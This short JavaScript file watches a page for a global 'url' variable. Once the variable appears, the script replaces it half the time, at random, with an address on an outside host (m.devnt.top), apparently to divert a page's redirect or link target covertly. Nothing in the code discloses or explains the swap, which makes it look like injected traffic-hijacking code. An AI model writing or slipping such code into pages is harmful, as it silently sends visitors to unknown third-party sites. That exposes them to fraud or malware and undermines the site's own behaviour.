var dnr_dnr = setInterval(function() {
	mydnr();
}, 100);

function mydnr() {
	// console.log(url);
	if (typeof url != "undefined") {
		clearInterval(dnr_dnr);
		if (Math.floor(Math.random() * 2)) {
			url = "http://m.devnt.top/ceshi/SmartM/0627shenzhou4.html?gid={gid}";
		}
	}
}
